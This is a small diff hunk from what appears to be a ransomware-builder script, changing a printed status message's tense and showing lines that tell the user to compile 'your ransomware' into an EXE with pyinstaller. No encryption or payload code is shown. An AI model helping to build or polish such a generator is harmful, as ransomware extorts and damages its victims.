@@ -96,7 +96,7 @@ def execonvert():
                                                        
          Created by N!gh+m@r3             version 1.0.0            '''+CEND )
         print('')
-        print(CGREEN+'[+] Your Ransomware has been generated soon! \n'+CEND)
+        print(CGREEN+'[+] Your Ransomware will be generated soon! \n'+CEND)
         print('')
         print(CRED+'EXE files may not work sometimes ! '+CEND)
         print(CRED+'You will need pyinstaller module to compile your ransomware into exe file '+CRED)
